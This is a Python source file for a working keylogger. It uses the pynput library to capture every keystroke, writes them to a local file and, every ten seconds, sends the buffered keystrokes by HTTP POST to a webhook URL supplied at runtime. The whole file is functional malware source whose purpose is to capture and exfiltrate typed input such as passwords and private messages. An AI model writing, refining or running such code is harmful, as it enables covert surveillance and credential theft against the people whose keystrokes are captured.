import time
import threading
import requests
from pynput import keyboard
from banner import print_banner  # <-- import banner

# Ask webhook URL at runtime
WEBHOOK_URL = input("Enter webhook URL: ")

# Path to the keystrokes file
KEYSTROKE_FILE = "keystrokes.txt"

# Store captured keystrokes in a variable
keystrokes = ""

# Lock for thread safety
keystroke_lock = threading.Lock()

# Function to record key presses
def on_press(key):
    global keystrokes
    try:
        keystrokes += key.char  # Regular character keys
    except AttributeError:
        keystrokes += f"[{key}]"  # Special keys

    with open(KEYSTROKE_FILE, "a") as file:
        try:
            if hasattr(key, 'char') and key.char:
                file.write(key.char)
            else:
                file.write(f"[{key}]")
        except AttributeError:
            file.write(f"[{key}]")

    if key == keyboard.Key.esc:
        print("Esc key pressed, stopping the keylogger.")
        return False

# Function to send keystrokes to the webhook
def send_keystrokes():
    global keystrokes
    while True:
        time.sleep(10)
        if keystrokes:
            payload = {"data": keystrokes}
            try:
                response = requests.post(WEBHOOK_URL, data=payload)
                if response.status_code == 200:
                    print("Keystrokes sent successfully.")
                else:
                    print(f"Failed to send keystrokes. HTTP status code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Error sending keystrokes: {e}")

            with keystroke_lock:
                keystrokes = ""

def start_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def start_keylogger():
    threading.Thread(target=send_keystrokes, daemon=True).start()
    start_listener()

if __name__ == "__main__":
    print_banner()  # <-- show banner first
    print("Keylogger started. Press ESC to stop.")
    start_keylogger()
